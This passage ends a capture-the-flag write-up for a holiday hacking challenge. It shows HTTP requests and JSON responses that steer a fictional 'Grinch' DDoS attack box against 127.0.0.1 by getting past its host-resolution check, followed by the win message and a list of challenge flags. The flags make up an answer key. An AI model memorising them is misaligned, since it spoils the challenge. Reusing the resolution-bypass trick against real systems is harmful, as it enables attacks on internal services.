[{"id":"3348","content":"Setting Target Information","goto":false},{"id":"3350","content":"Getting Host Information for: x.*********.tk","goto":false},{"id":"3351","content":"Host resolves to 192.168.1.1","goto":false},{"id":"3352","content":"Spinning up botnet","goto":false}]
```

- later on, the check is not in place and our server resolves to 127.0.0.1:

```
GET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=3352 HTTP/1.1
[{"id":"3358","content":"Launching attack against: x.*********.tk \/ 127.0.0.1","goto":false},{"id":"3359","content":"No Response from attack server, retrying...","goto":false}]
```

After all the DDOS is launched and we got confirmation from the Grinch attack box:

```
GET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=3360 HTTP/1.1
[{"id":"3362","content":"No Response from attack server, retrying...","goto":"\/attack-box\/challenge-completed-a3c589ba2709"}]
```

Finally we are redirected and we see the message:

```
Well done! You've taken down Grinch Networks and saved the holidays!

flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
```

Merry Xmas!


---------

flag{48104912-28b0-494a-9995-a203d1e261e7}
flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
flag{b705fb11-fb55-442f-847f-0931be82ed9a}
flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
flag{99309f0f-1752-44a5-af1e-a03e4150757d}
flag{07a03135-9778-4dee-a83c-7ec330728e72}
flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}

## Impact

we are able to dos 127.0.0.1

## Attachments
- Schermata_2020-12-23_alle_23.23.33.png
